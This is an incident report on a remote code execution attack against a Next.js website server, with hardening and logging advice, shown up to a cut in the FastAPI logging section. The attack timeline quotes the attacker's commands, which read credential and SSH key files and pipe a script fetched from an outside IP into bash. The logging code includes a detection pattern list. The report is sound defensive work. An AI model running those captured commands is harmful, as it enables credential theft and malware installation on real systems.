# Security Incident Report - December 11, 2025

## Executive Summary

**Incident Type**: Remote Code Execution (RCE) Attack
**Severity**: CRITICAL
**Date Detected**: December 11, 2025
**Attack Window**: December 10, 2025 01:47 UTC - December 11, 2025 05:02 UTC
**Affected Systems**: PersonalWeb03-NextJs application on Avatar04 server
**Status**: Attack partially mitigated by lack of elevated privileges

A sophisticated Remote Code Execution (RCE) attack was detected targeting the PersonalWeb03-NextJs application. The attacker successfully exploited a code injection vulnerability to execute arbitrary shell commands on the server. The attack progressed through reconnaissance, credential exfiltration attempts, and attempted malware installation. **The attack was only partially successful** due to:
1. Application running without root privileges (permission denied on package installation)
2. Sensitive files not present in expected locations
3. File permissions preventing access to system files

However, the **vulnerability still exists** and could be exploited with different privileges or against different file configurations.

---

## Attack Timeline

### Phase 1: Initial Probing (Dec 10, 01:47 UTC)
**Objective**: Test injection vectors

```
 ⨯ SyntaxError: Unexpected token '.'
 ⨯ TypeError: The "command" argument must be of type string. Received type number (NaN)
```

**Analysis**: Attacker tested JavaScript code injection vectors, attempting to:
- Inject malformed JavaScript that would be eval'd or executed
- Pass invalid data types to command execution functions
- The errors suggest the application has unsafe dynamic code execution (eval, Function constructor, or child_process)

### Phase 2: Command Injection Refinement (Dec 10, 18:10 - 22:53 UTC)
**Objective**: Refine shell injection payload

```
/bin/sh: 1: Syntax error: ")" unexpected
```

**Analysis**: Attacker refined shell command injection payloads, attempting to:
- Escape string boundaries
- Execute shell commands through Node.js child_process
- Multiple attempts suggest they were testing different injection contexts

### Phase 3: Environment File Reconnaissance (Dec 11, 03:44 UTC)
**Objective**: Locate and enumerate .env files

**Commands Executed**:
```bash
test -f .env && echo EXISTS | base64 -w 0
test -f .env.production && echo EXISTS | base64 -w 0
test -f .env.development && echo EXISTS | base64 -w 0
test -f .env.staging && echo EXISTS | base64 -w 0
test -f ../.env && echo EXISTS | base64 -w 0
test -f ../.env.local && echo EXISTS | base64 -w 0
test -f ../.env.production && echo EXISTS | base64 -w 0
test -f /var/www/.env && echo EXISTS | base64 -w 0
test -f /var/www/html/.env && echo EXISTS | base64 -w 0
test -f /var/www/html/.env.local && echo EXISTS | base64 -w 0
test -f /app/.env && echo EXISTS | base64 -w 0
test -f /app/.env.local && echo EXISTS | base64 -w 0
test -f /app/.env.production && echo EXISTS | base64 -w 0
test -f /opt/app/.env && echo EXISTS | base64 -w 0
test -f /srv/app/.env && echo EXISTS | base64 -w 0
test -f /root/.env && echo EXISTS | base64 -w 0
```

**Result**: All commands returned `status: 1` (file not found)
**Impact**: No .env files were discovered or compromised

**Analysis**:
- Systematic enumeration of common .env file locations
- Use of base64 encoding to exfiltrate file existence data
- Comprehensive search pattern suggests automated attack toolkit
- Base64 encoding used to obfuscate exfiltration and bypass basic monitoring

### Phase 4: Sensitive File Exfiltration (Dec 11, 05:01 - 05:02 UTC)
**Objective**: Steal credentials, secrets, and SSH keys

**Commands Executed**:

```bash
# Environment files
cat .env 2>/dev/null
cat .env.production 2>/dev/null
cat .env.development 2>/dev/null
cat ../.env 2>/dev/null
cat /app/.env 2>/dev/null

# System files
cat /etc/shadow 2>/dev/null

# SSH keys
cat ~/.ssh/id_rsa 2>/dev/null
cat /home/ubuntu/.ssh/id_rsa 2>/dev/null
cat /home/ubuntu/.ssh/id_ed25519 2>/dev/null
cat /home/ubuntu/.ssh/authorized_keys 2>/dev/null
cat /root/.ssh/id_rsa 2>/dev/null
cat /root/.ssh/id_ed25519 2>/dev/null
cat /root/.ssh/authorized_keys 2>/dev/null

# Git credentials
cat ~/.git-credentials 2>/dev/null
cat /home/ubuntu/.git-credentials 2>/dev/null
cat /root/.git-credentials 2>/dev/null
cat ~/.gitconfig 2>/dev/null

# Cloud provider credentials
cat ~/.aws/credentials 2>/dev/null
cat ~/.aws/config 2>/dev/null

# Container/Package credentials
cat ~/.docker/config.json 2>/dev/null
cat ~/.npmrc 2>/dev/null
```

**Result**: All commands returned `status: 1` (file not found or permission denied)
**Impact**: No credentials were successfully exfiltrated

**Analysis**:
- Comprehensive credential harvesting attempt
- Targeted multiple authentication systems (SSH, Git, AWS, Docker, NPM)
- Use of `2>/dev/null` to suppress errors and evade detection
- Attacker knew they were in a Node.js/NPM environment (targeted .npmrc)

### Phase 5: Malware Installation Attempt (Dec 11, 05:02 UTC)
**Objective**: Establish persistent backdoor access

**Commands Executed**:

```bash
# Alpine Linux (apk)
apk add --no-cache curl python3 2>/dev/null && \
  curl -s http://67.217.57.240:666/files/proxy.sh | bash

# Debian/Ubuntu (apt)
apt-get update -qq && apt-get install -y -qq curl python3 2>/dev/null && \
  curl -s http://67.217.57.240:666/files/proxy.sh | bash

# RHEL/CentOS (yum)
yum install -y -q curl python3 2>/dev/null && \
  curl -s http://67.217.57.240:666/files/proxy.sh | bash
```

**Results**:
- `apk`: status 127 (command not found)
- `apt-get`: status 100 with errors:
  ```
  E: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
  E: Unable to lock directory /var/lib/apt/lists/
  ```
- `yum`: status 127 (command not found)

**Impact**: Malware installation FAILED due to insufficient permissions

**Analysis**:
- **CRITICAL**: Attacker attempted to download and execute malicious script from external server
- Malware server: `http://67.217.57.240:666/files/proxy.sh`
- Targeted multiple Linux distributions (comprehensive approach)
- Failed because application was not running as root
- The malware payload likely included:
  - Reverse shell / Command & Control (C2) backdoor
  - Cryptocurrency miner
  - Additional privilege escalation exploits
  - Lateral movement capabilities

**IoC (Indicators of Compromise)**:
- **Malicious IP**: 67.217.57.240
- **Malicious Port**: 666 (common for malware C2)
- **Malicious Resource**: /files/proxy.sh

---

## Attack Vector Analysis

### Vulnerability Type: Remote Code Execution (RCE)

The attack pattern indicates the PersonalWeb03-NextJs application has a **code injection vulnerability** that allows attackers to execute arbitrary shell commands. Based on the error patterns, the vulnerability likely exists in one of these areas:

#### 1. **Unsafe Dynamic Code Execution**
```javascript
// VULNERABLE PATTERNS:
eval(userInput)
Function(userInput)()
new Function(userInput)()
```

The `SyntaxError: Unexpected token` errors suggest user input is being passed to `eval()`, `Function()`, or similar dynamic code execution.

#### 2. **Unsafe Child Process Execution**
```javascript
// VULNERABLE PATTERNS:
const { exec, execSync } = require('child_process');
exec(userInput)
execSync(userInput)
child_process.spawn('sh', ['-c', userInput])
```

The successful shell command execution indicates unsanitized input to Node.js `child_process` module.

#### 3. **Server-Side Template Injection (SSTI)**
If using server-side rendering with template engines that allow code execution (Handlebars, Pug with unsafe settings, etc.).

#### 4. **Unsafe Serialization/Deserialization**
If using `JSON.parse()` with reviver functions or other deserialization that executes code.

### Entry Points (Potential)

Based on the application architecture, likely entry points include:

1. **API Routes** (`/api/*` endpoints) - if they exist but weren't found in current codebase
2. **Server Actions** (Next.js `use server` functions) - none currently detected
3. **Middleware** (authentication, logging, analytics)
4. **Third-party Dependencies** (vulnerable npm packages)
5. **Server-Side Rendering** (unsafe data handling in RSC)

### Why the Attack Partially Failed

1. **Lack of Root Privileges**: Application running as non-root user
   - Cannot install system packages
   - Cannot modify system files (/etc/shadow)
   - Cannot access protected directories

2. **File Configuration**:
   - No .env files in standard locations
   - SSH keys not in expected paths
   - AWS credentials not configured

3. **File Permissions**:
   - Proper permission restrictions on sensitive files
   - User isolation preventing cross-user file access

**IMPORTANT**: These are **mitigating factors**, not fixes. The vulnerability still exists and could be exploited:
- Against different file configurations
- By attackers who escalate privileges
- To exfiltrate other data (source code, databases, sessions)
- To execute DoS attacks
- To pivot to other systems on the network

---

## Impact Assessment

### Actual Impact (This Attack)
- ✅ **No data exfiltration confirmed** (files not found/accessible)
- ✅ **No malware installation** (permission denied)
- ✅ **No credential theft** (files not accessible)
- ✅ **No privilege escalation** (insufficient permissions)
- ⚠️  **Application availability impacted** (multiple failed requests, error logging)

### Potential Impact (If Attack Succeeded)
- 🔴 **Complete server compromise** via malware backdoor
- 🔴 **Credential theft** (SSH keys, cloud credentials, API tokens)
- 🔴 **Data breach** (source code, databases, user data)
- 🔴 **Lateral movement** to other systems (PersonalWeb03-API, PersonalWeb03-Services, Maestro05)
- 🔴 **Supply chain attack** (code injection into git repository)
- 🔴 **Persistent access** (backdoor installation)
- 🔴 **Resource hijacking** (cryptocurrency mining)
- 🔴 **Service disruption** (DoS, ransomware)

### Business Impact
- **Reputation damage** if breach became public
- **Legal/compliance issues** (data protection violations)
- **Financial loss** (incident response, system rebuild, downtime)
- **Customer trust erosion**

---

## Root Cause Analysis

### Why This Vulnerability Exists

1. **Insufficient Input Validation**
   - User input not sanitized before processing
   - Missing allowlist validation
   - No input length/character restrictions

2. **Unsafe Code Patterns**
   - Use of dynamic code execution (eval, Function)
   - Unsafe child_process usage without sanitization
   - Lack of secure coding standards

3. **Missing Security Controls**
   - No Web Application Firewall (WAF)
   - No Runtime Application Self-Protection (RASP)
   - No intrusion detection/prevention
   - Insufficient logging of security events

4. **Architectural Issues**
   - Application has excessive permissions
   - No sandboxing of code execution
   - Missing principle of least privilege

5. **Development Process Gaps**
   - No security code review
   - Missing SAST/DAST security testing
   - No dependency vulnerability scanning
   - Lack of security training

---

## Prevention Measures

### A. Next.js Application Hardening

#### 1. **Eliminate Code Injection Vulnerabilities**

**DO NOT USE** these dangerous patterns:
```javascript
// ❌ NEVER DO THIS:
eval(userInput)
Function(userInput)()
new Function(userInput)()
child_process.exec(userInput)
child_process.execSync(userInput)
vm.runInThisContext(userInput)
```

**INSTEAD**, use safe alternatives:
```javascript
// ✅ For dynamic values, use type-safe approaches:
const allowedValues = ['option1', 'option2', 'option3'];
if (allowedValues.includes(userInput)) {
  // Process validated input
}

// ✅ For shell commands, use parameterized execution:
const { execFile } = require('child_process');
execFile('command', ['arg1', 'arg2'], (error, stdout, stderr) => {
  // Safely execute with separated args
});
```

#### 2. **Input Validation & Sanitization**

**Install and configure validation libraries**:
```bash
npm install zod validator express-validator
```

**Implement strict validation**:
```typescript
import { z } from 'zod';

// Define schemas for all inputs
const UserInputSchema = z.object({
  name: z.string().min(1).max(100).regex(/^[a-zA-Z0-9\s-]+$/),
  email: z.string().email(),
  category: z.enum(['option1', 'option2', 'option3']),
});

// Validate all user input
export async function handler(req: Request) {
  try {
    const validated = UserInputSchema.parse(req.body);
    // Only process validated data
  } catch (error) {
    return Response.json({ error: 'Invalid input' }, { status: 400 });
  }
}
```

**Key validation rules**:
- Use allowlists (not denylists)
- Validate data type, length, format, range
- Reject unexpected input (fail closed)
- Sanitize before processing
- Validate on both client and server

#### 3. **Security Headers**

**Update `next.config.mjs`**:
```javascript
/** @type {import('next').NextConfig} */
const nextConfig = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: "default-src 'self'; script-src 'self' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' https://api.nick-rodriguez.info;",
          },
          {
            key: 'X-Frame-Options',
            value: 'DENY',
          },
          {
            key: 'X-Content-Type-Options',
            value: 'nosniff',
          },
          {
            key: 'Referrer-Policy',
            value: 'strict-origin-when-cross-origin',
          },
          {
            key: 'Permissions-Policy',
            value: 'camera=(), microphone=(), geolocation=()',
          },
        ],
      },
    ];
  },
};

export default nextConfig;
```

#### 4. **Rate Limiting**

**Install rate limiting middleware**:
```bash
npm install express-rate-limit
```

**Implement rate limiting** (in middleware or API routes):
```typescript
import rateLimit from 'express-rate-limit';

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // Limit each IP to 100 requests per windowMs
  message: 'Too many requests from this IP',
  standardHeaders: true,
  legacyHeaders: false,
});

export async function middleware(request: Request) {
  // Apply rate limiting logic
}
```

#### 5. **Dependency Security**

**Add to `package.json` scripts**:
```json
{
  "scripts": {
    "audit": "npm audit",
    "audit:fix": "npm audit fix",
    "audit:production": "npm audit --omit=dev"
  }
}
```

**Run regularly**:
```bash
# Check for vulnerabilities
npm audit

# Automatically fix vulnerabilities
npm audit fix

# Check production dependencies only
npm audit --omit=dev
```

**Consider adding**:
```bash
npm install --save-dev snyk
npx snyk test
npx snyk wizard
```

#### 6. **Environment Variable Security**

**Never commit .env files**:
```bash
# .gitignore
.env
.env.local
.env.production
.env.development
.env.*.local
```

**Use runtime environment variables only**:
```typescript
// In production, set via PM2 ecosystem file or system environment
// Never store in files on the server
```

**Validate environment variables at startup**:
```typescript
// lib/env.ts
import { z } from 'zod';

const envSchema = z.object({
  NEXT_PUBLIC_API_BASE_URL: z.string().url(),
  NODE_ENV: z.enum(['development', 'production', 'test']),
});

export const env = envSchema.parse(process.env);
```

#### 7. **API Route Protection**

**Implement authentication middleware**:
```typescript
// middleware.ts
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export function middleware(request: NextRequest) {
  // Validate JWT token
  const token = request.headers.get('authorization');

  if (!token) {
    return NextResponse.json(
      { error: 'Unauthorized' },
      { status: 401 }
    );
  }

  // Validate token (implement proper JWT validation)
  // ...

  return NextResponse.next();
}

export const config = {
  matcher: '/api/:path*',
};
```

#### 8. **Server Action Security** (if using)

```typescript
'use server'

import { z } from 'zod';

const schema = z.object({
  name: z.string().min(1).max(100),
});

export async function serverAction(formData: FormData) {
  // Always validate input
  const validated = schema.safeParse({
    name: formData.get('name'),
  });

  if (!validated.success) {
    return { error: 'Invalid input' };
  }

  // Never use validated input in shell commands
  // Never use eval/Function with user input
  // ...
}
```

---

### B. FastAPI Application Hardening

#### 1. **Input Validation with Pydantic**

**Always use strict Pydantic models**:
```python
from pydantic import BaseModel, Field, validator
import re

class UserInput(BaseModel):
    name: str = Field(..., min_length=1, max_length=100)
    email: str = Field(..., regex=r'^[\w\.-]+@[\w\.-]+\.\w+$')

    @validator('name')
    def validate_name(cls, v):
        if not re.match(r'^[a-zA-Z0-9\s-]+$', v):
            raise ValueError('Invalid characters in name')
        return v

@app.post("/api/endpoint")
async def endpoint(data: UserInput):
    # data is validated and type-safe
    pass
```

#### 2. **Prevent SQL Injection**

**Use SQLAlchemy ORM with parameterized queries**:
```python
# ✅ SAFE - Using ORM
from sqlalchemy import select

stmt = select(User).where(User.email == user_email)
result = session.execute(stmt)

# ✅ SAFE - Parameterized query
from sqlalchemy import text

stmt = text("SELECT * FROM users WHERE email = :email")
result = session.execute(stmt, {"email": user_email})

# ❌ NEVER DO THIS - String concatenation
# stmt = f"SELECT * FROM users WHERE email = '{user_email}'"
```

#### 3. **Command Injection Prevention**

**Avoid subprocess execution with user input**:
```python
import subprocess
import shlex

# ❌ NEVER DO THIS:
# subprocess.run(f"command {user_input}", shell=True)

# ✅ IF NECESSARY, use parameterized execution:
subprocess.run(
    ["command", validated_arg1, validated_arg2],
    shell=False,  # NEVER use shell=True with user input
    timeout=10,
    check=True
)
```

**Better: Avoid shell commands entirely**:
```python
# Use Python libraries instead of shell commands
import os
import pathlib

# Instead of: subprocess.run(f"ls {directory}")
# Use: list(pathlib.Path(directory).iterdir())
```

#### 4. **Security Headers (FastAPI)**

```python
from fastapi.middleware.cors import CORSMiddleware
from fastapi import FastAPI

app = FastAPI()

# Configure CORS strictly
app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "https://nick-rodriguez.info",
        "http://localhost:3000",  # Only in development
    ],
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["Authorization", "Content-Type"],
)

@app.middleware("http")
async def add_security_headers(request, call_next):
    response = await call_next(request)
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    return response
```

#### 5. **Rate Limiting (FastAPI)**

**Install slowapi**:
```bash
pip install slowapi
```

**Implement rate limiting**:
```python
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

@app.post("/api/login")
@limiter.limit("5/minute")
async def login(request: Request, credentials: LoginCredentials):
    # Only 5 login attempts per minute per IP
    pass

@app.get("/api/data")
@limiter.limit("100/hour")
async def get_data(request: Request):
    # 100 requests per hour per IP
    pass
```

#### 6. **JWT Security**

**Fix: JWT tokens should expire**:
```python
from datetime import datetime, timedelta
from jose import jwt

SECRET_KEY = os.getenv("JWT_SECRET_KEY")  # Strong random key
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 30  # NOT forever!

def create_access_token(data: dict):
    to_encode = data.copy()
    expire = datetime.utcnow() + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    to_encode.update({"exp": expire})
    encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
    return encoded_jwt

def verify_token(token: str):
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        # Token automatically validated for expiration
        return payload
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expired")
    except jwt.JWTError:
        raise HTTPException(status_code=401, detail="Invalid token")
```

#### 7. **File Upload Security**

**If allowing blog post ZIP uploads**:
```python
import zipfile
import os
from pathlib import Path

ALLOWED_EXTENSIONS = {'.md', '.jpg', '.png', '.gif', '.webp'}
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB
MAX_ZIP_SIZE = 50 * 1024 * 1024  # 50MB

async def validate_and_extract_zip(file: UploadFile):
    # Validate file size
    contents = await file.read()
    if len(contents) > MAX_ZIP_SIZE:
        raise HTTPException(400, "File too large")

    # Validate it's a real ZIP file
    try:
        with zipfile.ZipFile(io.BytesIO(contents)) as zf:
            # Check for zip bomb
            total_size = sum(info.file_size for info in zf.filelist)
            if total_size > MAX_ZIP_SIZE * 10:
                raise HTTPException(400, "Suspicious ZIP file")

            # Validate all file paths (prevent path traversal)
            for info in zf.filelist:
                # Normalize path and check it doesn't escape
                normalized = Path(info.filename).resolve()
                if '..' in Path(info.filename).parts:
                    raise HTTPException(400, "Invalid file path in ZIP")

                # Check file extension
                ext = Path(info.filename).suffix.lower()
                if ext not in ALLOWED_EXTENSIONS:
                    raise HTTPException(400, f"File type not allowed: {ext}")

            # Extract safely
            zf.extractall(safe_directory)
    except zipfile.BadZipFile:
        raise HTTPException(400, "Invalid ZIP file")
```

#### 8. **Database Security**

**Connection string security**:
```python
# ❌ NEVER COMMIT DATABASE CREDENTIALS
# database_url = "postgresql://user:password@localhost/db"

# ✅ Use environment variables
database_url = os.getenv("DATABASE_URL")
if not database_url:
    raise ValueError("DATABASE_URL not set")

# ✅ Use connection pooling with limits
from sqlalchemy import create_engine

engine = create_engine(
    database_url,
    pool_size=10,
    max_overflow=20,
    pool_pre_ping=True,  # Verify connections before use
    echo=False,  # Don't log SQL in production
)
```

**Prevent information disclosure**:
```python
from fastapi import HTTPException

@app.exception_handler(Exception)
async def generic_exception_handler(request, exc):
    # Log full error internally
    logger.error(f"Error: {exc}", exc_info=True)

    # Return generic error to user (don't expose stack traces)
    return JSONResponse(
        status_code=500,
        content={"error": "Internal server error"}
    )
```

---

### C. Server OS Hardening (Ubuntu 24.04)

#### 1. **User & Permission Management**

```bash
# Create dedicated service user (no login, no shell)
sudo useradd -r -s /bin/false webapp

# Set proper ownership
sudo chown -R webapp:webapp /opt/PersonalWeb03-NextJs
sudo chown -R webapp:webapp /opt/PersonalWeb03-API
sudo chown -R webapp:webapp /opt/PersonalWeb03-Services

# Restrict permissions
sudo chmod 750 /opt/PersonalWeb03-NextJs
sudo chmod 750 /opt/PersonalWeb03-API
sudo chmod 750 /opt/PersonalWeb03-Services

# Run applications as this user (in PM2 ecosystem file)
```

**Update PM2 ecosystem to run as non-root**:
```javascript
module.exports = {
  apps: [{
    name: 'PersonalWeb03-NextJs',
    script: 'npm',
    args: 'start',
    cwd: '/opt/PersonalWeb03-NextJs',
    user: 'webapp',  // Run as dedicated user
    env: {
      NODE_ENV: 'production',
      PORT: 3000
    }
  }]
}
```

#### 2. **Firewall Configuration**

```bash
# Enable UFW firewall
sudo ufw default deny incoming
sudo ufw default allow outgoing

# Allow only necessary ports
sudo ufw allow 22/tcp    # SSH (consider changing default port)
sudo ufw allow 80/tcp    # HTTP
sudo ufw allow 443/tcp   # HTTPS

# Deny all other ports
sudo ufw enable

# Verify
sudo ufw status verbose
```

**Restrict SSH access**:
```bash
# Edit SSH config
sudo nano /etc/ssh/sshd_config

# Add/modify:
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
AllowUsers your_username  # Specific users only
MaxAuthTries 3
ClientAliveInterval 300
ClientAliveCountMax 2

# Restart SSH
sudo systemctl restart sshd
```

#### 3. **Fail2Ban (Intrusion Prevention)**

```bash
# Install fail2ban
sudo apt update
sudo apt install fail2ban -y

# Configure
sudo nano /etc/fail2ban/jail.local
```

**Add configuration**:
```ini
[DEFAULT]
bantime = 1h
findtime = 10m
maxretry = 5
destemail = your-email@example.com
sendername = Fail2Ban

[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3

[nginx-http-auth]
enabled = true
filter = nginx-http-auth
port = http,https
logpath = /var/log/nginx/error.log

[nginx-noscript]
enabled = true
port = http,https
filter = nginx-noscript
logpath = /var/log/nginx/access.log
maxretry = 6

[nginx-badbots]
enabled = true
port = http,https
filter = nginx-badbots
logpath = /var/log/nginx/access.log
maxretry = 2

[nginx-noproxy]
enabled = true
port = http,https
filter = nginx-noproxy
logpath = /var/log/nginx/access.log
maxretry = 2
```

```bash
# Start fail2ban
sudo systemctl enable fail2ban
sudo systemctl start fail2ban

# Monitor
sudo fail2ban-client status
sudo fail2ban-client status sshd
```

#### 4. **System Updates & Patching**

```bash
# Enable automatic security updates
sudo apt install unattended-upgrades -y

# Configure
sudo dpkg-reconfigure -plow unattended-upgrades

# Edit config
sudo nano /etc/apt/apt.conf.d/50unattended-upgrades
```

**Enable automatic security patches**:
```
Unattended-Upgrade::Allowed-Origins {
    "${distro_id}:${distro_codename}-security";
};
Unattended-Upgrade::AutoFixInterruptedDpkg "true";
Unattended-Upgrade::MinimalSteps "true";
Unattended-Upgrade::Remove-Unused-Kernel-Packages "true";
Unattended-Upgrade::Remove-Unused-Dependencies "true";
Unattended-Upgrade::Automatic-Reboot "false";
```

#### 5. **File Integrity Monitoring**

**Install AIDE (Advanced Intrusion Detection Environment)**:
```bash
sudo apt install aide -y

# Initialize database
sudo aideinit

# Move database
sudo mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db

# Check integrity
sudo aide --check

# Add to cron for daily checks
echo "0 2 * * * root /usr/bin/aide --check | mail -s 'AIDE Report' your-email@example.com" | sudo tee -a /etc/crontab
```

#### 6. **Nginx Security Hardening**

**Update `/etc/nginx/nginx.conf`**:
```nginx
# Hide nginx version
server_tokens off;

# Buffer overflow protection
client_body_buffer_size 1K;
client_header_buffer_size 1k;
client_max_body_size 10M;
large_client_header_buffers 2 1k;

# Timeouts
client_body_timeout 10;
client_header_timeout 10;
keepalive_timeout 5 5;
send_timeout 10;

# Limit connections
limit_conn_zone $binary_remote_addr zone=addr:10m;
limit_conn addr 10;

# Rate limiting
limit_req_zone $binary_remote_addr zone=one:10m rate=1r/s;
```

**Update site configuration** (`/etc/nginx/sites-available/nick-rodriguez.info`):
```nginx
server {
    listen 443 ssl http2;
    server_name nick-rodriguez.info;

    # Security headers
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

    # Rate limiting
    limit_req zone=one burst=5 nodelay;

    # Block access to hidden files
    location ~ /\. {
        deny all;
        access_log off;
        log_not_found off;
    }

    # Block access to sensitive files
    location ~* \.(env|git|svn|htaccess|htpasswd)$ {
        deny all;
        access_log off;
        log_not_found off;
    }

    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;

        # Timeout settings
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;
    }
}
```

```bash
# Test and reload
sudo nginx -t
sudo systemctl reload nginx
```

#### 7. **System Auditing**

**Enable auditd**:
```bash
sudo apt install auditd -y

# Monitor sensitive files
sudo auditctl -w /etc/passwd -p wa -k passwd_changes
sudo auditctl -w /etc/shadow -p wa -k shadow_changes
sudo auditctl -w /etc/ssh/sshd_config -p wa -k sshd_config
sudo auditctl -w /opt/PersonalWeb03-NextJs -p wa -k webapp_changes

# Monitor command execution
sudo auditctl -a exit,always -F arch=b64 -S execve -k command_execution

# Save rules
sudo auditctl -w /etc/audit/rules.d/audit.rules

# View logs
sudo ausearch -k passwd_changes
```

#### 8. **Disable Unnecessary Services**

```bash
# List running services
sudo systemctl list-units --type=service --state=running

# Disable unnecessary services
sudo systemctl disable snapd
sudo systemctl disable bluetooth
sudo systemctl disable cups

# Remove unnecessary packages
sudo apt autoremove -y
```

---

## Logging Recommendations

### Objectives
1. Detect attacks in real-time
2. Provide forensic evidence
3. Enable incident response
4. **DO NOT** log sensitive data (passwords, tokens, credit cards)
5. **DO NOT** log user input unsanitized (prevents log injection)

### A. Application Logging (Next.js)

**Install winston for structured logging**:
```bash
npm install winston
```

**Create logger** (`lib/logger.ts`):
```typescript
import winston from 'winston';

const logger = winston.createLogger({
  level: process.env.NODE_ENV === 'production' ? 'info' : 'debug',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.errors({ stack: true }),
    winston.format.json()
  ),
  defaultMeta: { service: 'personalweb03-nextjs' },
  transports: [
    new winston.transports.File({
      filename: '/var/log/personalweb03/error.log',
      level: 'error',
      maxsize: 10485760, // 10MB
      maxFiles: 10,
    }),
    new winston.transports.File({
      filename: '/var/log/personalweb03/security.log',
      level: 'warn',
      maxsize: 10485760,
      maxFiles: 30,
    }),
    new winston.transports.File({
      filename: '/var/log/personalweb03/combined.log',
      maxsize: 10485760,
      maxFiles: 14,
    }),
  ],
});

if (process.env.NODE_ENV !== 'production') {
  logger.add(new winston.transports.Console({
    format: winston.format.simple(),
  }));
}

export default logger;
```

**Security Event Logging**:
```typescript
import logger from '@/lib/logger';

// Log authentication attempts
export async function loginHandler(credentials: LoginCredentials) {
  const sanitizedEmail = credentials.email.replace(/[^\w@.-]/g, '');

  try {
    const user = await authenticate(credentials);
    logger.info('Login successful', {
      event: 'auth.login.success',
      email: sanitizedEmail,
      ip: request.ip,
      userAgent: request.headers['user-agent'],
      timestamp: new Date().toISOString(),
    });
  } catch (error) {
    logger.warn('Login failed', {
      event: 'auth.login.failure',
      email: sanitizedEmail,
      ip: request.ip,
      userAgent: request.headers['user-agent'],
      reason: 'invalid_credentials',
      timestamp: new Date().toISOString(),
    });
    throw error;
  }
}

// Log suspicious requests
export async function apiHandler(req: Request) {
  // Detect suspicious patterns
  const suspiciousPatterns = [
    /eval\s*\(/i,
    /exec\s*\(/i,
    /child_process/i,
    /\.\.\//,  // Path traversal
    /<script/i,  // XSS
    /union.*select/i,  // SQL injection
    /base64/i,
  ];

  const body = await req.text();

  for (const pattern of suspiciousPatterns) {
    if (pattern.test(body)) {
      logger.warn('Suspicious request detected', {
        event: 'security.suspicious_request',
        pattern: pattern.source,
        ip: req.ip,
        method: req.method,
        url: req.url,
        userAgent: req.headers.get('user-agent'),
        // DO NOT log full body (could contain exploit code)
        bodyLength: body.length,
        timestamp: new Date().toISOString(),
      });

      return Response.json(
        { error: 'Bad request' },
        { status: 400 }
      );
    }
  }
}

// Log rate limit violations
export function logRateLimitExceeded(req: Request) {
  logger.warn('Rate limit exceeded', {
    event: 'security.rate_limit_exceeded',
    ip: req.ip,
    path: req.url,
    userAgent: req.headers.get('user-agent'),
    timestamp: new Date().toISOString(),
  });
}

// Log validation failures
export function logValidationFailure(req: Request, errors: any) {
  logger.warn('Input validation failed', {
    event: 'security.validation_failure',
    ip: req.ip,
    path: req.url,
    errorCount: errors.length,
    // Log error types, not values
    errorTypes: errors.map((e: any) => e.path),
    timestamp: new Date().toISOString(),
  });
}
```

**Events to Log**:
```typescript
// Security events
'auth.login.success'
'auth.login.failure'
'auth.logout'
'auth.password_reset.request'
'auth.password_reset.success'
'security.validation_failure'
'security.rate_limit_exceeded'
'security.suspicious_request'
'security.unauthorized_access'
'security.permission_denied'

// Application events
'api.request'
'api.error'
'api.slow_query' (>1s response time)

// System events
'app.startup'
'app.shutdown'
'app.error.critical'
```

### B. FastAPI Logging

**Configure structured logging** (`app/logging_config.py`):
```python
import logging
import json
from datetime import datetime
from typing import Any, Dict

class JSONFormatter(logging.Formatter):
    def format(self, record: logging.LogRecord) -> str:
        log_data: Dict[str, Any] = {
            'timestamp': datetime.utcnow().isoformat(),
            'level': record.levelname,
            'service': 'personalweb03-api',
            'message': record.getMessage(),
            'module': record.module,
            'function': record.funcName,
        }

        if hasattr(record, 'event'):
            log_data['event'] = record.event
        if hasattr(record, 'ip'):
            log_data['ip'] = record.ip
        if hasattr(record, 'user_id'):
            log_data['user_id'] = record.user_id

        if record.exc_info:
            log_data['exception'] = self.formatException(record.exc_info)

        return json.dumps(log_data)

# Configure logging
logging.basicConfig(level=logging.INFO)

# File handlers
security_handler = logging.FileHandler('/var/log/personalweb03/api-security.log')
security_handler.setLevel(logging.WARNING)
security_handler.setFormatter(JSONFormatter())

